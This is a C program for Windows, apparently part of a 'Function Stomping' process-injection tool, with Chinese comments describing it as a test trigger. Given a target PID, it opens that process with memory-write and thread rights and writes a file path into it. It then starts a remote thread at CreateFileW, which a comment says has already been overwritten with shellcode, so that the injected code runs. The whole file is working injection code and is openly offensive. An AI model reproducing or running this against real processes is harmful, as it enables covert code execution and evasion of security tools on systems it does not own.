#include <windows.h>
#include <stdio.h>

/**
 * 触发CreateFileW函数
 * 用于测试Function Stomping注入
 */

typedef HANDLE (WINAPI *CreateFileW_t)(
    LPCWSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
);

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <target_pid>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    printf("[+] Triggering CreateFileW in PID %u\n", pid);

    // 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    if (!hProcess) {
        printf("[-] Failed to open process: %u\n", GetLastError());
        return 1;
    }
    printf("[+] Opened target process\n");

    // 获取kernel32.dll基址
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        printf("[-] Failed to get kernel32.dll handle\n");
        CloseHandle(hProcess);
        return 1;
    }

    // 获取CreateFileW地址（已被shellcode覆盖）
    CreateFileW_t pCreateFileW = (CreateFileW_t)GetProcAddress(hKernel32, "CreateFileW");
    if (!pCreateFileW) {
        printf("[-] Failed to get CreateFileW address\n");
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] CreateFileW address: %p (stomped)\n", pCreateFileW);

    // 在目标进程中分配参数字符串
    wchar_t testPath[] = L"C:\\Users\\Public\\test_stomped.txt";
    SIZE_T pathSize = sizeof(testPath);

    LPVOID pRemotePath = VirtualAllocEx(
        hProcess,
        NULL,
        pathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!pRemotePath) {
        printf("[-] Failed to allocate remote memory: %u\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Allocated remote path at %p\n", pRemotePath);

    // 写入路径字符串
    if (!WriteProcessMemory(hProcess, pRemotePath, testPath, pathSize, NULL)) {
        printf("[-] Failed to write path: %u\n", GetLastError());
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Wrote file path to remote process\n");

    // 创建远程线程调用CreateFileW（触发shellcode）
    printf("[+] Creating remote thread to call CreateFileW (shellcode will execute)...\n");

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pCreateFileW,
        pRemotePath,  // lpFileName参数
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] Failed to create remote thread: %u\n", GetLastError());
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Remote thread created! Shellcode should execute now.\n");

    // 等待线程完成（shellcode执行）
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Shellcode execution completed\n");

    // 清理
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("[+] Trigger completed successfully!\n");
    return 0;
}
